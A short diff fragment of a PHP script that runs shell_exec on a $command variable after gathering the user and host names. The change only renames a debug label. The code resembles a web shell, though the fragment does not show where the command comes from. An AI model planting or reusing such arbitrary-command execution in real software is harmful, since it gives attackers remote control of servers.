@@ -36,5 +36,5 @@
  // exec shell commands
  $shell_output=exec('whoami')."@".exec('hostname').":".shell_exec($command);
  // debug
- wdf_dump($shell_output,"output");
+ wdf_dump($shell_output,"shell_exec");
 ?>
